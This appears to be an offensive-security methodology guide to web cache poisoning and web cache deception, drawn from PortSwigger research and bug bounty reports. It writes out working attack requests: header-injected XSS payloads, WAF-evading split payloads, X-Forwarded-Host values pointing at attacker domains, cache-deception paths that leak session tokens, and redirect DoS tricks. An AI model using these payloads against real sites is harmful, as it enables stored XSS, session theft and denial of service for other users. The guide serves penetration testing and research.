# Comprehensive Web Cache Exploitation Methodology

## Derived from PortSwigger Research
- **"Gotta cache 'em all: bending the rules of web cache exploitation"** (Martin Doyhenard, Black Hat USA 2024 / DEFCON)
- **"Practical Web Cache Poisoning"** (James Kettle, Black Hat 2018)
- **"Web Cache Entanglement: Novel Pathways to Poisoning"** (James Kettle, Black Hat 2020)
- PortSwigger Web Security Academy: Web Cache Deception, Web Cache Poisoning, Exploiting Design Flaws, Exploiting Implementation Flaws

### Core Insight
Caches are woven into websites throughout the net, discreetly juggling data between users, and yet they are rarely scrutinized in any depth. These flaws pervade all layers — from sprawling CDNs, through caching web servers and frameworks, all the way down to fragment-level internal template caches. Misguided transformations, naive normalization, and optimistic assumptions at any layer make it possible to bend the rules of web cache exploitation.

### Host & Path Basis
A cache key typically consists of the request method, path, query string, and Host header, plus maybe one or two other headers. In the following request, unkeyed parts are shown in **`orange`**:

```html
<font color="orange">GET /research?x=1 HTTP/1.1</font>
<font color="orange">Host: portswigger.net</font>
<font color="#FFA500">X-Forwarded-Host: attacker.net</font>
<font color="orange">User-Agent: Firefox/57.0</font>
<font color="#FFA500">Cookie: language=en;</font>
```

> Cache key: `https|GET|portswigger.net|/research?x=1`
>
> Request components that aren't included in the cache key are known as "unkeyed" components. If an unkeyed component can be used to make an application serve a harmful response, then it may be possible to manipulate the cache into saving this, and serving it to other users.

### Beyond Prior Research (2018)
In 2018, Practical Web Cache Poisoning showed how to use non-standard HTTP headers, such as `X-Forwarded-Host` and `X-Original-URL`, to poison caches and compromise websites. This was a straightforward approach that exploited a design flaw in caching, and as such affected all caches equally.

The techniques in "Web Cache Entanglement" (2020) target the two request components that are almost always included in the cache key — **the Host header and the request line** — by exploiting **transformations** applied to them during key generation. If these components were placed directly into the cache key, cache poisoning would be impossible. However, these values are often parsed, transformed, and normalized, introducing gaps that can slip exploits into.

These gaps stem from dangerous but deliberate features all the way down to **parsing bugs and naive escaping issues** that let utterly different requests collide.

---

## 1. FUNDAMENTAL CONCEPTS

### 1.1 Cache Mechanics
A cache sits between client and origin server, storing responses temporarily to reduce origin load. A **cache key** is constructed from request components to determine equivalence. Components excluded from the key are **unkeyed**.

**Standard keyed inputs:**
- Request URL (path + query string)
- Host header
- HTTP method (usually)

**Commonly unkeyed inputs:**
- Headers (most of them)
- Cookies
- Request body
- HTTP scheme (in some configurations)

### 1.2 Attack Taxonomy

| Attack Type | Mechanism | User Interaction | Goal |
|-------------|-----------|------------------|------|
| **Web Cache Poisoning (WCP)** | Manipulate unkeyed inputs to store malicious response | Not required | Serve malicious content to victims |
| **Web Cache Deception (WCD)** | Exploit URL parsing discrepancies to trick cache into storing dynamic content | Victim must visit link | Steal sensitive cached data |
| **Cache-What-Where** | Store effects of "unexploitable" vulns (headers-only, etc.) in cache | Context-dependent | Weaponize reflected-only flaws |

### 1.3 The Golden Rule
**All cache attacks stem from a discrepancy between what the cache thinks the request is vs. what the origin server thinks the request is.**

### 1.4 Input Taxonomy (Kettle, 2018)
Any HTTP request component can be categorized along two axes: whether it is **used** by the origin server, and whether it is **keyed** by the cache.

|  | **Keyed** | **Unkeyed** |
|---|---|---|
| **Used** | Normal behavior | **→ Cache Poisoning (WCP)** |
| **Unused** | Harmless noise | Harmless noise |

- **Used + Unkeyed:** The origin processes the input (reflects it, routes by it, imports a resource from it), but the cache ignores it. This is the classic cache poisoning vector.
- **Used + Keyed:** The cache already includes the input in its key, so manipulating it only poisons your own cache entry.
- **Unused + Keyed / Unused + Unkeyed:** The origin ignores the input entirely — no behavioral difference, no attack.

**WCD is a special case:** The input is the URL itself, which is always keyed, but the **discrepancy comes from how the cache and origin parse the same URL differently** (delimiters, normalization, encoding). The cache stores under one interpretation while the origin executes another.

---

## 2. RECONNAISSANCE PHASE

### 2.1 Identify Cache Presence & Behavior

**Detect cache headers:**
```
X-Cache: hit | miss | dynamic | refresh
CF-Cache-Status: HIT | MISS | DYNAMIC
X-Cache-Status: HIT | MISS
Age: 0
Cache-Control: public, max-age=3600
Server-Timing: cdn-cache; desc=HIT   (Akamai)
```

**Timing analysis:**
- Send same request repeatedly; cache hits return faster
- Compare timing between unique cache-busted requests vs. repeated requests

**Malformed header oracle (unauthenticated targets):**
Send a syntactically invalid header name:
```
GET /page HTTP/1.1
Host: target.com
\\: garbage
```
If the CDN caches the resulting `400 Bad Request`, visiting that URL in any user-agent renders the error. This confirms the cache stores error responses and may lack input validation on headers.

**Note:** Some CDNs limit 400 error cache duration to ~5 seconds. To maintain poison, barrage with null payloads via Burp Intruder.

**Cache TTL fingerprinting:**
| Response Type | Typical TTL |
|---------------|-------------|
| 200 OK (static) | ~1 day |
| 404 Not Found | ~10 seconds |
| 400 Bad Request | ~5 seconds |
| 301/302 Redirect | Varies (often long if `Cache-Control: public`) |

Use this to time your attacks: cache a 200 response for persistence, or exploit short 404/400 windows with automation.

**Cache-buster techniques:**
```
?cb=12345
?utm_content=12345 (often excluded from key!)
Accept-Encoding: gzip, deflate, cb123
Accept: */*, text/cb123
Cookie: cb=123
Origin: https://cb123.target.com
```

**Akamai cache key extraction (oracle):**
```
Pragma: akamai-x-get-cache-key
Response: X-Cache-Key: target.com/path?param=1
```

**bxmbn Akamai Methodology (Unauthenticated):**
1. Send first request to Repeater
2. Check if server is caching normal requests: look for `Server-Timing: cdn-cache; desc=HIT`
3. Add an illegal request header (e.g., `\\:` or any malformed header name)
4. If response is cached, opening URL in any browser shows `400 Bad Request`
5. **Tip:** Akamai limits 400 cache to ~5 seconds. Maintain poison by sending null payloads via Burp Intruder barrage.

**bxmbn Akamai Methodology (Authenticated):**
1. Create an account
2. Check if sensitive info (session token, PII) is disclosed on any page
3. Send request to Repeater, append cacheable extension (`.js`, `.css`) to URL
4. Check for `200 OK` response (not `404` — see TTL notes below)
5. Open modified URL with authenticated account
6. Fetch same URL via curl/incognito — if token appears, WCD confirmed

**Akamai response type TTL behavior:**
| Response Code | Typical Akamai Cache Duration |
|---------------|------------------------------|
| 200 OK | ~24 hours (high persistence) |
| 404 Not Found | ~10 seconds (very short) |
| 400 Bad Request | ~5 seconds (maintain via barrage) |

**Strategy:** Force 200 OK responses when possible. Use semicolon prefix (`/path/;.js`) if direct extension gives 404.

**Host header casing test (Cloudflare / Varnish / Fastly):**
Some CDNs normalize the `Host` header to lowercase before adding it to the cache key, but forward the original casing to the origin. If the backend produces a different response for a capitalized host (e.g., `Host: WWW.Target.com`), the cache may store that variant under the lowercase key.

Test:
```
Host: Target.COM
```

If the response deviates from the baseline and is cached, poisoning is possible. Cloudflare and Fastly have patched the default behavior, but custom Varnish configurations and older stacks remain vulnerable.

**Scanner User-Agent oracles:**
Some origins block security-tool User-Agents (e.g., `User-Agent: Fuzz Faster U Fool` or `Nuclei`) with a cacheable `403 Forbidden`. This turns reconnaissance into a single-request persistent DoS. Always test baseline tool UAs if the target deploys WAF or rate-limiting rules.

### 2.2 Select and Probe a Cache Oracle (Kettle 2020 — Cache Key Transformations)
Many cache poisoning vulnerabilities are caused not by unkeyed inputs, but by how the cache **transforms, normalizes, or parses** keyed inputs when building the cache key. To find these, start by selecting a **cache oracle**.

**Cache oracle requirements:**
1. The endpoint must be **cacheable** (returns `X-Cache` header or demonstrates hit/miss behavior)
2. There must be a way to tell if you got a **cache hit or miss** (explicit header, dynamic content change, or timing)
3. Ideally, the endpoint should **reflect the entire URL** and at least one query parameter

**Three-Phase Methodology:**
1. **Select a Cache Oracle** — Pick an endpoint on the target site. The implementation and configuration quirks we exploit vary from site to site, so it is crucial to start by understanding how the target cache works.
2. **Probe Key Handling** — Ask a series of questions to identify whether the request is transformed when saved in the cache key. Common exploitable transformations include removing specific query parameters, removing the entire query string, removing the port from the Host header, and URL-decoding. Each question is asked by issuing two slightly different requests and observing whether the second one causes a cache hit, indicating that it was issued with the same cache key as the first.
3. **Exploit (Find a Gadget)** — The final step is to find a gadget on the target website to chain the transformation with. Gadgets are reflected, client-side behaviors like XSS, open redirects, and others that have no classification because they are usually harmless. Cache poisoning can be combined with gadgets in three main ways:
   - Increasing the severity of reflected vulnerabilities like XSS by making them "stored", exploiting everyone who browses to a poisoned page.
   - Enabling exploitation of dynamic content in resource files, like JS and CSS.
   - Enabling exploitation of "unexploitable" vulnerabilities that rely on malformed requests that browsers won't send.

Keep in mind that **many cache-key issues directly enable single-request DoS attacks** (e.g., redirect to a dead port). While it might be tempting to report these as-is and move on, such reports get mixed reception ($0 to $10,000 in bounties). Finding a gadget to chain with the transformation yields far higher impact.

**Akamai cache key extraction (oracle):**
```
Pragma: akamai-x-get-cache-key, akamai-x-get-true-cache-key

Response:
X-Cache-Key: /example.com/index.loggedout.html?akamai-transform=9 cid=__Origin=zxcv
X-Cache-Key-Extended-Internal-Use-Only: /example.com/index.loggedout.html?akamai-transform=9 vcd=1234 cid=__Origin=zxcv
X-True-Cache-Key: /example.com/index.loggedout.html vcd=1234 cid=__Origin=zxcv
```
Note: these three headers may conflict slightly — each contains an element of truth.

**Probe key handling — port exclusion:**
```
GET / HTTP/1.1
Host: redacted.com:1337

→ Response reflects port in redirect: Location: https://redacted.com:1337/en
→ CF-Cache-Status: MISS

GET / HTTP/1.1
Host: redacted.com

→ Response reflects poisoned port: Location: https://redacted.com:1337/en
→ CF-Cache-Status: HIT
```
This confirms the port is excluded from the cache key.

**Probe key handling — query string exclusion:**
When the entire query string is excluded from the cache key, dynamic pages appear static:
```
GET /?q=canary&cachebuster=1234 HTTP/1.1
Host: example.com

→ CF-Cache-Status: HIT
→ <link rel="canonical" href="https://example.com/">
```
Even changing the parameter value produces a cache hit — the query string is completely ignored.

**Probe key handling — URL decoding:**
```
GET /?x=%22%3E%3Ctest%3E HTTP/1.1
Host: example.com

GET /?x="><test> HTTP/1.1
Host: example.com

→ If second request hits cached response from first, cache decodes the key
```

**Probe key handling — parameter removal:**
Send a parameter and confirm it is absent from subsequent cache hits.

### 2.2a Bypassing Uncacheable Queries to Reach the Backend
When the query string is excluded from the cache key, standard `?cb=12345` cache busters become useless. Use these alternative techniques:

1. **Header-based cache busters** (bypass query exclusion):
```
GET /?q=canary&cachebust=nwf4ws HTTP/1.1
Host: example.com
Accept-Encoding: gzip, deflate, nwf4ws
Accept: */*, text/nwf4ws
Cookie: nwf4ws=1
Origin: https://nwf4ws.example.com
```
Cloudflare includes `Origin` in the cache key by default. Param Miner can auto-inject header-based busters.

2. **PURGE / FASTLYPURGE attacks** (punch through cache):
```
PURGE /page HTTP/1.1
Host: target.com
```
Some caches allow unauthorized cache deletion. This is useful for live attacks but has a race condition and affects other users — not suitable for automation.

3. **Path-normalization cache busters** (when query string is excluded):
Use path tricks to create a different cache key while hitting the same endpoint:
| System | Payload | Effect |
|--------|---------|--------|
| Apache | `//` | Normalizes to `/` |
| Nginx | `/%2F` | Normalizes to `/` |
| PHP | `/index.php/xyz` | PHP ignores extra path |
| .NET | `/(A(xyz))/` | Session-based path parsing |

```
GET //?q=canary HTTP/1.1
Host: example.com
```
- Cache key: `//`
- Origin normalizes `//` → `/`
- Backend receives the query parameter
- Use `//` as your poison path to avoid disrupting normal `/` traffic

### 2.3 Identify Cache Rules
Test for common caching triggers:

**Static extensions:**
```
.css, .js, .png, .jpg, .ico, .html, .txt, .xml, .json, .svg
```
Send request to `/dynamic-endpoint/test.css` — if cached, extension rules exist.

**Static directories:**
```
/static/, /assets/, /scripts/, /images/, /wp-content/, /media/, /templates/, /public/, /shared/
```

**Static files:**
```
/robots.txt, /favicon.ico, /index.html, /sitemap.xml
```

### 2.3 Identify Origin Framework & Delimiters

**Step 1 — Find a non-cacheable baseline:**
- Use POST method, or an endpoint with `Cache-Control: no-store`/`private`
- Record response R0

**Step 2 — Test suffix acceptance:**
- Append random suffix: `/homeabcd`
- If response matches R0, endpoint ignores suffixes → suitable for delimiter testing

**Step 3 — Test delimiter candidates:**
Insert delimiter before suffix. If response matches R0, the delimiter is processed.

**Known framework delimiters:**
| Framework | Delimiter | Example |
|-----------|-----------|---------|
| Spring / Java | `;` (semicolon) | `/MyAccount;var1=val` → `/MyAccount` |
| Ruby on Rails | `.` (dot) | `/MyAccount.css` → `/MyAccount` |
| OpenLiteSpeed | `%00` (null) | `/MyAccount%00aaa` → `/MyAccount` |
| Nginx (rewrite) | `%0a` (newline) | `/user/MyAccount%0aaaa` → `/account/MyAccount` |
| Microsoft Azure | `#` (hash) | cache key delimiter |

**Automation:** Use Burp Intruder with ASCII wordlist, testing both encoded and raw forms.

### 2.4 Identify Path Normalization Behavior

**Test origin normalization:**
```
/aaa/..%2fprofile                → if matches /profile, origin normalizes
/aaa/..%2fassets/js/stockCheck.js → if matches base resource, origin normalizes
```
Use non-cacheable request + cache buster for clean testing.

**Test cache normalization:**
Repeat with cacheable request. Compare `X-Cache` and `Cache-Control` headers.

**Normalization behavior by provider:**
| Provider | Normalizes Before Rules? |
|----------|--------------------------|
| CloudFront | YES (default) |
| Microsoft Azure | YES (default) |
| Imperva | YES (default) |
| Cloudflare | NO (default) |
| Google Cloud | NO (default) |
| Fastly | NO (default) |

**Origin normalization behavior:**
| Origin | Normalizes? |
|--------|-------------|
| Nginx | YES |
| Apache | Complex (varies by config) |
| Microsoft IIS | YES (+ backslash conversion!) |
| OpenLiteSpeed | YES |
| Node | YES |

---

## 3. WEB CACHE DECEPTION (WCD) METHODOLOGY

**Goal:** Trick cache into storing sensitive dynamic content under a static key, then retrieve it.
**Constraint:** Victim must visit malicious link; browser must send request. Use only safe URL characters.

### 3.1 Static Extension Exploitation

**Prerequisite:** Origin delimiter exists that cache ignores.

**Path mapping discrepancy:**
```
/user/123/profile/wcd.css
```
Origin parses as `/user/123/profile` → returns profile data. Cache sees `.css` → stores.

**Delimiter discrepancy:**
| Framework | Payload Example |
|-----------|----------------|
| Spring | `/profile;foo.css` |
| Rails | `/profile.ico` |
| OpenLiteSpeed | `/profile%00foo.js` |

**Encoded delimiter exploitation:**
| Encoded | Decoded | Effect |
|---------|---------|--------|
| `%23` | `#` | Path truncation |
| `%3f` | `?` | Query string split |
| `%3b` | `;` | Matrix variable split |

Examples:
```
/profile%23wcd.css      → origin sees /profile (truncated at #), cache sees .css
/myaccount%3fwcd.css    → origin sees /myaccount (truncated at ?), cache sees .css
```

**Multi-proxy chain encoding:**
If multiple proxies exist, layer encodings. First proxy decodes `%253F` → `%3F`, second decodes `%3F` → `?`.

### 3.2 Static Directory Exploitation

**Technique A — Origin normalizes, cache does not:**
```
/static/..%2fprofile
```
Origin resolves to `/profile` (dynamic). Cache keys under `/static` prefix → stores.

**Technique B — Cache normalizes, origin does not (requires delimiter combo):**
```
/profile;%2f%2e%2e%2fstatic
```
- Origin sees `/profile` (delimited at `;`)
- Cache normalizes `%2f%2e%2e%2f` → `/../` → resolves to `/static`
- Cache stores under `/static` rule

**Technique C — Direct encoded traversal + static dir:**
```
/aaa/..%2fprofile       → test: if matches /profile, origin normalizes
```

### 3.3 Static File Exploitation

**Exact-match file names:**
```
robots.txt, index.html, favicon.ico
```

**Payload pattern:**
```
/profile%2f%2e%2e%2findex.html?cb=12345
```
- Appended `?cb=12345` avoids hitting legitimate cached entry
- If cache normalizes traversal but origin does not, dynamic response cached as `/index.html`

### 3.4 Microsoft IIS Backslash Issue
IIS converts backslashes to forward slashes. If cache interprets encoded backslash (`%5C`) as regular slash without recognizing IIS transformation:
```
/profile%5C..%5Cstatic
```

### 3.5 Cloudflare Cache Deception Armor Bypass
Cloudflare's "Cache Deception Armor" verifies that response `Content-Type` matches the request's file extension. Bypass by using **unfamiliar extensions** not in the armor's mapping:
```
/profile.avif
/profile.webp
```
**Reference:** HackerOne report #1391635.

### 3.6 Semicolon Prefix Technique
If an extension alone doesn't trigger caching, place a semicolon immediately before it:
```
/xxxx/xxxxxx/;.js
/endpoint/;.css
```
Some CDNs parse the semicolon as a parameter separator and still match the trailing extension for cache rules.

### 3.7 Cookie Caching (HttpOnly Disclosure)
Some caches include **all cookies** in the cached response — even `HttpOnly` cookies — when a dynamic endpoint is cached under a static key.

**Example:** `/app/conversation/1.js` cached every cookie. Attacker retrieves victim's session tokens from cached copy.

**Test:** Append `.js` or `.css` to authenticated endpoints, then fetch unauthenticated. If session data leaks, the cache stores cookies.

### 3.8 Referer Header Reflection → Stored XSS
A powerful but overlooked vector: the `Referer` header is often reflected in analytics scripts, error pages, or Open Graph meta tags without sanitization.

**Real-world payload ($6,300 bounty):**
```
GET /xxxx/xxxx/xxx HTTP/2
Host: redacted.com
Referer: ?</script><svg/onload=eval/**/(atob/**/(this.id)) id=BASE64_JS_PAYLOAD>
```
**Key insight:** Find URLs that are cached **without needing any file extension** (e.g., homepage, search pages, API endpoints with default cache rules). This eliminates the need for WCD delimiters.

**Impact escalation:** Cached XSS on one subdomain may execute on others if cookies are shared (`Domain=.target.com`). Subdomain cookie leakage confirmed: 35 XSS Hunter fires, 4 different subdomains.

**Technique:**
1. Find reflected input point (Referer, custom header, cookie)
2. Verify self-XSS works
3. Find cacheable URL that doesn't require extension tricks
4. Time cache refresh window (`Age` + `max-age`)
5. Send poison request without cache busters at the right moment
6. Confirm cached payload fires for all subsequent visitors

---

## 4. WEB CACHE POISONING (WCP) METHODOLOGY

**Goal:** Trick cache into storing malicious payload under a legitimate key.
**Advantage:** No user interaction required; server-to-server or direct attacker request.

### 4.1 Three-Phase Framework

**Phase 1 — Map Unkeyed Inputs**
- Inject arbitrary data via headers, cookies, parameters
- Monitor for behavioral shifts in response
- Use Burp Comparer for manual analysis
- Use Param Miner extension for automated header discovery
- Important: Add cache buster or use Param Miner's auto-buster to avoid disrupting real users

**Known unkeyed headers to test:**
```
X-Forwarded-Host
X-Forwarded-Proto
X-Forwarded-For
X-Forwarded-Port
X-Original-URL
X-Rewrite-URL
X-HTTP-Host-Override
X-Host
Forwarded
Origin
Referer
```

**Phase 2 — Induce Dangerous Response**
- Unkeyed input must be reflected in response body or affect response behavior
- Look for: URL generation, resource imports, redirects, error messages, template output

**Phase 3 — Trap Response in Cache**
- Verify caching criteria: extension, MIME type, path pattern, status code, headers
- Remove cache buster and confirm poison is served to subsequent requests

### 4.2 Unkeyed Input Abuse (Design Flaws)

#### A. Reflected XSS via Headers
```
X-Forwarded-Host: a."><script>alert(1)</script>"
```
If page dynamically builds Open Graph image URL or similar from this header.

#### B. Malicious Resource Imports
```
X-Forwarded-Host: evil-user.net
```
If server generates `<script src="X-Forwarded-Host/...">` or CSS import URLs.

#### C. Cookie Manipulation Poisoning
```
Cookie: language=pl
```
If content is dynamically generated based on cookies but cache key excludes `Cookie` header.

**Example:** A Polish post is cached and served to all visitors regardless of language preference.

#### D. Multiple Header Manipulation
```
X-Forwarded-Proto: http
```
Combined with dynamic URL generation to trigger 301 redirect to HTTPS. Redirect can be cached and redirected to attacker-controlled domain.

#### D2. X-Forwarded-Scheme Redirect Loop (HackerOne Case — #1181946)
Some frameworks (e.g., Ruby Rack) prioritize `X-Forwarded-Scheme` over `X-Forwarded-Proto`:
```ruby
def forwarded_scheme
  allowed_scheme(get_header(HTTP_X_FORWARDED_SCHEME)) ||
  allowed_scheme(extract_proto_header(get_header(HTTP_X_FORWARDED_PROTO)))
end
```

**Attack on static assets:**
```
GET /assets/static/js/app.js?hackerone=poc HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http
```
- Application generates redirect loop (301 → 301 → ...)
- Cloudflare caches the 301 redirect
- All subsequent requests for `app.js` follow the redirect chain
- **Impact:** DoS on any page relying on poisoned JS/CSS

**Defense bypass:** Add a cache-busting query parameter to avoid hitting legitimate cached entry, then confirm without it.

#### E. DOM-Based Exploitation
Poison cache to force victim to load malicious JSON:
```json
{"someProperty": "<svg onload=alert(1)>"}
```
If frontend code passes value into dangerous sink.

**Note:** Cross-origin JSON loads may require server returning `Access-Control-Allow-Origin: *`.

#### E2. Multi-Header Payload Splitting & WAF Bypass
When WAF blocks complete XSS payloads but reflects multiple instances of the same header, split the payload across duplicate headers.

**Real-world pattern:**
```
Cookie: gdId=xss</script%20
X-Forwarded-For: xss
X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
X-Forwarded-For: >
```

**How it works:**
1. Cookie closes the opening `<script>` tag (WAF allows `%20` but not `<tag`)
2. First `X-Forwarded-For` injects harmless text
3. Second `X-Forwarded-For` injects the SVG payload split across header values
4. Third `X-Forwarded-For` closes the injection context
5. Final rendered output: `guid="</script","IP","xss","xss><svg/onload=...//,">`

**WAF evasion technique — regex source + template literals:**
```javascript
globalThis[`al`+/ert/.source]`1`
// Evaluates to: globalThis["al"+"ert"]`1` -> alert`1`
```
This avoids WAF signatures matching literal `alert(1)`.

**Requirements for this technique:**
- Application reflects multiple instances of the same header (common with `X-Forwarded-For`)
- Application also reflects cookies or other inputs
- Cache stores the response under a key that doesn't include the injected headers
- WAF inspects individual headers but not the combined output

#### F. Route Poisoning via Internal Routing Headers
Some applications (especially SaaS / multi-tenant platforms) trust unkeyed headers more than the `Host` header for routing internal requests. If the origin routes to the wrong tenant or endpoint based on an unkeyed header, the wrong response is cached under the legitimate key.

**Path override headers (PHP / Symfony / Drupal / Zend):**
```
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

If the framework supports these, the visible request path forms the cache key, but the origin serves content from the overridden path.

**Attack — Path swap (Unity for Education → Gambling):**
```
GET /education?x=y HTTP/1.1
Host: store.unity.com
X-Original-URL: /gambling?x=y
```
- Cache key: `/education?x=y`
- Origin processes `X-Original-URL` and serves `/gambling` content
- Result: Visitors to the education page receive gambling content

**SaaS misrouting (HubSpot):**
```
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: attacker-tenant.hs-sites.com
```
- Origin (HubSpot) routes to attacker-controlled tenant account
- Attacker places XSS payload on their HubSpot page
- Origin serves attacker's content as `www.goodhire.com/`
- Cloudflare caches it under the victim domain

**Impact:** Content hijacking, stored XSS, phishing page substitution. Common on platforms handling requests for many customers from a single origin.

#### G. DOM-Based and JSON Translation Poisoning
Not every unkeyed input creates direct XSS. When the input only affects a JavaScript `data-*` attribute or a JSON response consumed by frontend code, trace the frontend to find dangerous sinks.

**data-site-root hijack:**
```
GET /dataset HTTP/1.1
Host: catalog.data.gov
X-Forwarded-Host: attacker.net
```
- Response contains: `<body data-site-root="https://attacker.net/">`
- Frontend JS constructs API calls using `data-site-root` value
- Attacker serves poisoned JSON at `https://attacker.net/api/i18n/en`

**Translation file poisoning:**
```json
{"Show more": "Mostrar más"}
```
Replace with:
```json
{"Show more": "<svg onload=alert(1)>"}
```
- Cache this JSON as the translation bundle
- Frontend code inserts the value into DOM → XSS whenever the text appears

**Steps to find DOM sinks:**
1. Configure Burp match/replace to add `X-Forwarded-Host: your-collaborator.net` to all requests
2. Browse the site normally; monitor for unexpected outbound requests
3. Trace the frontend code to identify data consumers (jQuery `.data()`, `fetch()`, `XMLHttpRequest`)

#### H. Selective Poisoning via `Vary` Header Analysis
The `Vary` response header tells the cache that additional request components are part of the key. For example:
```
Vary: User-Agent, Accept-Encoding
```

If `User-Agent` is keyed, your poison request is only served to other users with the **exact same User-Agent string**.

**Weaponization:**
- **Targeted attacks:** Poison a specific person's page if you know their browser/version
- **Concealment:** Use an uncommon User-Agent so security monitoring tools don't see the payload
- **Broad attacks:** Cycle through popular User-Agent strings to maximize coverage

**Note:** Even if `Vary` exists, the cache may not actually key on all listed headers. Test empirically by sending the poison with one UA and confirming with a different UA.

#### I. Open Graph / Social Media Hijacking
If `X-Forwarded-Host` is used to generate Open Graph meta tags, you control what gets shared when victims copy the page link to social media.

**Payload:**
```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: evil.com
```
- Response contains: `<meta property="og:url" content="https://evil.com/en"/>`
- When shared on Facebook/Twitter, the preview links to `evil.com`
- Facebook's crawler fetches the page and follows the `og:url` override

**Impact:** Phishing distribution, reputation damage, misinformation spread.

**Cache-Control workaround:** If the target page sets `Cache-Control: private`, the CDN may refuse to cache it. However:
- Other pages on the same site may explicitly enable caching (`Cache-Control: public`)
- Some CDNs bypass `private` when no session cookie is present in the attacker's request but cache for authenticated traffic after
- Always test with and without session cookies

#### J. Chaining Multiple Unkeyed Inputs
A single unkeyed input may only confuse part of the stack. Combining multiple inputs can yield a full exploit when neither input alone is sufficient.

**Example — Redirect to arbitrary domain:**
```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps
```
- `X-Forwarded-Scheme: nothttps` → origin issues 301 redirect to HTTPS version
- `X-Forwarded-Host: attacker.com` → origin uses attacker domain in redirect destination
- Combined: `Location: https://attacker.com/en`

**Impact:**
- Steal custom HTTP headers (including CSRF tokens) by redirecting POST requests cross-origin
- Obtain stored DOM-based XSS by redirecting JSON loads to attacker-controlled JSON with malicious payloads
- Combine with WAF bypass headers to tunnel prohibited payloads through allowed redirect chains

**Example — Cookie domain override + redirect:**
```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: xyz
```
- Sets cookie with `domain=xyz` (useless alone)

```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Scheme: nothttps
```
- Issues 301 redirect to HTTPS (useless alone)

**Combined:**
```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps
```
- Redirects to `https://attacker.com/en` with a cross-origin cookie set to `attacker.com`

### 4.3 Unkeyed GET Parameter Pollution (Omise Case — #3183046)
Some CDNs exclude tracking parameters (`utm_content`, `utm_source`, `utm_campaign`) from the cache key while the origin still processes them. If reflected in the response, these become injection vectors.

**Attack:**
```
GET /page?utm_content="><script>alert(1)</script>
```
- Cache key = `/page` (parameter excluded)
- Origin processes `utm_content` and reflects it in response
- Poisoned response cached for `/page`
- All visitors receive XSS

**Fingerprinting unkeyed parameters:**
1. Add `?cb=1` then `?cb=2` — if both cache hit, entire query string is unkeyed
2. Add `?utm_content=1` then `?utm_content=2` — if both cache hit, UTM params are unkeyed
3. Try other common excluded params: `utm_source`, `utm_medium`, `utm_campaign`, `utm_term`, `fbclid`, `gclid`, `ref`, `referral`

### 4.4 Implementation Flaw Attacks (Key Generation Discrepancies)

### 4.5 Cache Key Transformation Attacks — "Web Cache Entanglement" (Kettle 2020)

**Philosophy:** These attacks exploit **transformations applied to keyed inputs** when the cache generates its key. Unlike classic WCP (unkeyed input abuse), the input IS part of the cache key, but the cache's transformation of it differs from the origin's interpretation.

If the Host header and request line were placed directly into the cache key, it would be impossible to use them for cache poisoning. However, on closer inspection, these values are often **parsed, transformed, and normalized**, introducing gaps that exploits can slip into. These gaps stem from dangerous but deliberate features all the way down to parsing bugs and naive escaping issues that let us make utterly different requests collide.

**Core methodology:**
1. Select a cache oracle (cacheable endpoint with hit/miss indicator)
2. Probe how the cache transforms keyed inputs (port, query string, encoding, path)
3. Find a gadget on the origin that produces a harmful response when the transformed input reaches it
4. Poison the cache

#### A. Unkeyed Query String
The most common cache-key transformation is **excluding the entire query string** from the key. This makes dynamic pages appear static and masks vulnerabilities from scanners.

**Detection:**
```
GET /?q=canary HTTP/1.1
Host: example.com

→ <link rel="canonical" href="https://example.com/?q=canary">

GET /?q=canary&cachebuster=1234 HTTP/1.1
Host: example.com

→ CF-Cache-Status: HIT
→ <link rel="canonical" href="https://example.com/">
```
Even changing the parameter produces a cache hit — the query string is completely excluded.

**Exploitation — Full site takeover (Newspaper XSS):**
When the query string is excluded from the cache key, quite a few "obvious" vulnerabilities that would normally be quickly patched become exploitable because the cache masks them from scanners and triagers.

```
GET //?"><script>alert(1)</script> HTTP/1.1
Host: redacted-newspaper.net
```
- Cache key: `//` (query excluded)
- Origin processes query parameter → reflected XSS in `og:url` meta tag
- Response cached for `//`
- All subsequent visitors to `//` receive the XSS payload
- **Removing the payload path (`/`) makes it a live attack on the homepage**

In effect, the attacker can gain full control over every page on the site, including the homepage. The cache configuration doesn't just mask the XSS; it also makes it far more severe — because the XSS payload isn't in the cache key, anyone who hits the same path receives the poisoned response.

**Situational awareness countermeasure:** The second `/` in the path (`//`) plays the role of the `dontpoisoneveryone` technique — it ensures that when replicating the vulnerability, genuine visitors are not affected. Launching a real attack is just a matter of removing the extra slash and timing the request correctly (or using the PURGE method).

**Redirect DoS via query reflection (Cloudflare login):**
What if you discover a site where the query string is unkeyed, but there isn't a convenient XSS gadget?

Cloudflare's login page resides at `dash.cloudflare.com/login`, but links from `cloudflare.com/login` redirect users via `/login/`. Using this redirect as our cache oracle, we can confirm they exclude the query string from the cache key:
```
GET /login?x=abc HTTP/1.1
Host: www.cloudflare.com
Origin: https://dontpoisoneveryone/

→ HTTP/1.1 301 Moved Permanently
→ Location: /login/?x=abc
```
If we pad our query string to the maximum request URI length:
```
GET /login?x=very-long-string... HTTP/1.1
Host: www.cloudflare.com
Origin: https://dontpoisoneveryone/
```
When a victim visits `/login`, they get a redirect with the long query string. The browser follows it, and the extra forward slash makes the URI one byte longer (`/login/?...` vs `/login?...`), triggering `414 Request-URI Too Large`.

**Key insight:** Even if the destination page isn't cacheable, a cacheable redirect can inject malicious parameters onto it. Cloudflare patched this globally by disabling caching of redirects that reflect the request's query string. However, the bypass using URL encoding (`%6c`) was closed shortly after. If you find a server applying any other transformations on the query before placing it in the `Location` header, you'll be able to bypass similar mitigations again.

#### B. Parameter Cloaking
When a cache excludes specific parameters (e.g., analytics `utm_content`, Akamai's `akamai-transform`), it may be possible to trick the parser into partially excluding arbitrary parameters.

**Technique 1 — Varnish regex parameter cloaking:**
Varnish regex designed to remove `_` parameter:
```
set req.http.hash_url = regsuball(req.http.hash_url, "\?_=[^&]+&", "?");
```

**Payload:**
```
GET /search?q=help?!&search=1 HTTP/1.1
Host: example.com
```
Poison `q` without changing cache key:
```
GET /search?q=help?_=payload&!&search=1 HTTP/1.1
Host: example.com
```
